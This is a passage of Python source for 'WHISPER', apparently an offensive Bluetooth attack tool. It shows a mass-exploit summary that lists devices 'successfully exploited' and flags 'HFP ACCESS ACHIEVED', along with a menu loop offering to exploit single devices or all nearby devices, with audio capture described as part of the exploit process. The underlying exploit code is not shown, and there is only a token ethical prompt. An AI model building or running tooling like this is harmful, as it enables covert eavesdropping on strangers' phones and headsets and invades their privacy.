                    results.append({
                        "device": device.to_dict(),
                        "success": False,
                        "details": exploit_results
                    })
            
            # Show summary
            print(f"\n{self.COLOR['BLUE']}{'='*70}{self.COLOR['RESET']}")
            print(f"{self.COLOR['BOLD']}MASS EXPLOIT SUMMARY{self.COLOR['RESET']}")
            print(f"{self.COLOR['BLUE']}{'='*70}{self.COLOR['RESET']}")
            
            successful = sum(1 for r in results if r["success"])
            failed = len(results) - successful
            
            print(f"\n{self.COLOR['YELLOW']}Total devices: {len(results)}{self.COLOR['RESET']}")
            print(f"{self.COLOR['GREEN']}Successfully exploited: {successful}{self.COLOR['RESET']}")
            print(f"{self.COLOR['RED']}Failed: {failed}{self.COLOR['RESET']}")
            
            if successful > 0:
                print(f"\n{self.COLOR['YELLOW']}Vulnerable devices found:{self.COLOR['RESET']}")
                for result in results:
                    if result["success"]:
                        device = result["device"]
                        print(f"  {self.COLOR['GREEN']}✓{self.COLOR['RESET']} {device['name']} ({device['address']})")
                        
                        # Check if HFP was tested
                        details = result["details"]
                        if details.get("exploit_result") and "HFP" in details["exploit_result"]:
                            print(f"    {self.COLOR['RED']}⚠️  HFP ACCESS ACHIEVED{self.COLOR['RESET']}")
            
            # Save results
            try:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                results_file = f"whisper_results/exploits/mass_exploit_{timestamp}.json"
                
                with open(results_file, 'w') as f:
                    json.dump({
                        "timestamp": datetime.now().isoformat(),
                        "total_devices": len(results),
                        "successful": successful,
                        "failed": failed,
                        "results": results
                    }, f, indent=2)
                
                self.print_success(f"Mass exploit results saved to: {results_file}")
                
            except Exception as e:
                self.print_error(f"Failed to save results: {e}")
                
        else:
            self.print_warning("Mass exploit cancelled")
        
        input(f"\n{self.COLOR['CYAN']}Press Enter to continue...{self.COLOR['RESET']}")
    
    async def run(self):
        """Main interactive loop"""
        # Check for root
        if os.geteuid() != 0:
            self.print_error("WHISPER requires root privileges for Bluetooth operations")
            self.print_error("Please run with: sudo python whisper.py")
            sys.exit(1)
        
        # Display ethical warning
        if not self.display_ethical_warning():
            self.print_error("Ethical agreement not accepted. Exiting.")
            sys.exit(0)
        
        # Main loop
        while self.running:
            try:
                choice = self.display_main_menu()
                
                if choice == "1":
                    await self.handle_scan()
                elif choice == "2":
                    await self.handle_continuous_scan()
                elif choice == "3":
                    await self.handle_target_device()
                elif choice == "4":
                    self.handle_view_devices()
                elif choice == "5":
                    await self.handle_exploit_device()
                elif choice == "6":
                    await self.handle_exploit_all()
                elif choice == "7":
                    self.print_info("HFP testing is included in the exploit process")
                    input(f"\n{self.COLOR['CYAN']}Press Enter to continue...{self.COLOR['RESET']}")
                elif choice == "8":
                    self.print_info("Audio capture is included in the exploit process")
                    input(f"\n{self.COLOR['CYAN']}Press Enter to continue...{self.COLOR['RESET']}")
                elif choice == "9":
                    self.print_info("Scan history is in results/scans/ directory")
                    input(f"\n{self.COLOR['CYAN']}Press Enter to continue...{self.COLOR['RESET']}")
                elif choice == "10":
                    self.current_devices = []
                    self.last_scan_time = None
                    self.print_success("Device list cleared")
                    input(f"\n{self.COLOR['CYAN']}Press Enter to continue...{self.COLOR['RESET']}")
                elif choice == "0":
                    self.print_success("Exiting WHISPER. Stay ethical!")
                    self.running = False
                else:
                    self.print_error("Invalid option")
                    time.sleep(1)
                    
            except KeyboardInterrupt:
                print(f"\n\n{self.COLOR['YELLOW']}Interrupted by user{self.COLOR['RESET']}")
                confirm = input(f"{self.COLOR['CYAN']}Exit WHISPER? (y/N): {self.COLOR['RESET']}").lower()
                if confirm == 'y':
                    self.running = False
            except Exception as e:
                self.print_error(f"Unexpected error: {e}")
                import traceback
                traceback.print_exc()
                input(f"\n{self.COLOR['CYAN']}Press Enter to continue...{self.COLOR['RESET']}")

async def main():
    """Main entry point"""
    whisper = WhisperTerminal()
    await whisper.run()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n\n{WhisperTerminal().COLOR['YELLOW']}WHISPER terminated. Stay ethical!{WhisperTerminal().COLOR['RESET']}")
    except Exception as e:
        print(f"\n{WhisperTerminal().COLOR['RED']}Fatal error: {e}{WhisperTerminal().COLOR['RESET']}")
        import traceback
        traceback.print_exc()
